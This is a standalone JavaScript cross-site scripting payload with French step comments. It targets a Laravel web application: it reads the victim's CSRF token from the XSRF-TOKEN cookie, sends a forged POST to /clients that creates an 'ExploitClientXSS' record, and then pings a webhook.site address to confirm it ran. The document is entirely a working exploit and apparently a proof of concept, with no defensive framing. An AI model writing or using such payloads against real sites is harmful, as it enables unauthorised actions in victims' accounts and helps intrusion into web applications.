(function () {
  // 🧪 Étape 1 : récupérer le token CSRF depuis le cookie
  const tokenMatch = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
  if (!tokenMatch) return;
  const token = decodeURIComponent(tokenMatch[1]);

  // 🛠 Étape 2 : préparer le body encodé (comme un vrai formulaire Laravel)
  const body = new URLSearchParams({
    client_name: "ExploitClientXSS",
    new_activity: "",
    email: "xss@evil.com",
    language_id: "1",
    phone_number: "0606060606",
    phone_type: "primary",
    address: "PayloadLand",
    societeinfo_id: "",
    _token: token
  });

  // 🎯 Étape 3 : envoi POST vers /clients
  fetch("/clients", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: body.toString()
  });

  // ✅ (optionnel) Ping de fin dans webhook.site pour confirmer l’exécution
  fetch("https://webhook.site/4e27c3b8-ea10-40a9-a816-ac1d92350386?status=client_created");
})();
